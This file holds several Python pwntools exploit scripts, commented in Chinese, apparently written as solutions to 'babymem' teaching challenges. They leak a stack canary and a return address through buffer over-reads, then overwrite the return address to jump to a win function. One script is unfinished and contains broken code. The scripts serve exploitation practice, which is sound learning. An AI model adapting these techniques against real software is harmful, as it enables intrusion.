from pwn import *
# 需要多次泄露, 泄露canary, 泄露ret, 最后再覆盖
# 这一题是格式化字符串漏洞, 用%10d之类的方式对canary进行泄露, 然后覆写ret
# 但实际上, 如果是格式化字符串, 可以直接精准修改ret的地址=。=, 不用管canary了
# 好吧我还以为是格式化字符串, 结果还是栈泄露
pro_name = './babymem_level12_teaching1'
io = process(pro_name)

ret_base_addr = 0x2407
win_base_addr = 0x1b89

payload_0 = b'REPEATAA'+b'A'*368+b'b'
payload_1 = b'REPEATAA'+b'A'*384

io.recvuntil(b'size: ')
io.sendline(b'377')
io.recvuntil(b')!\n')
io.sendline(payload_0)
io.recvuntil(payload_0)
canary = b'\x00'+io.recv(7)
#print(canary)
io.recvuntil(b'size: ')
io.sendline(b'392')
io.recvuntil(b')!\n')
io.sendline(payload_1)
io.recvuntil(payload_1)
ret_addr = io.recv(6)+b'\x00\x00'
#print(ret_addr)

win_addr = p64(u64(ret_addr)-ret_base_addr+win_base_addr)
payload_2 = b'A'*47*8+canary+b'A'*8+win_addr
io.recvuntil(b'size: ')
io.sendline(b'400')
io.recvuntil(b')!\n')
io.sendline(payload_2)
io.interactive()

- - -
from pwn import *

pro_name = './babymem_level14_teaching1'
io = process(pro_name)

def fmt_func(payload):
    log.info("payload = {}".format(repr(payload)))
    io.recvuntil("size: ")
    io.sendline(bytes(str(len(payload+6)),encoding='utf8'))
    io.sendline(b'REPEAT'+payload)
    io.recvuntil(b'You said: ')
    ret = io.recv(len(payload)+6)
    return io.recv()

format_string = FmtStr(execute_fmt=fmt_func, offset=6)
format_string.write(0x188, )


from pwn import *

pro_name = './babymem_level14_teaching1'
io = process(pro_name)

io.recvuntil(b'size: ')
payload_0 = b'REPEAT'+b'AA'+b'B'*8*12+b'C'
io.sendline(bytes(str(len(payload_0)),encoding='utf8'))
io.recvuntil(b')!')
io.sendline(payload_0)
io.recvuntil(payload_0)
canary=b'\x00'+io.recv(7)
print(canary)
#io.interactive()
win = 0x1b89
payload_1 = b'A'*8*47+canary+b'B'*8+b'\x89\xab'
io.recvuntil(b'size: ')
io.sendline(bytes(str(len(payload_1)),encoding='utf8'))
#io.recvuntil(b')!')
io.sendline(payload_1)
io.interactive()
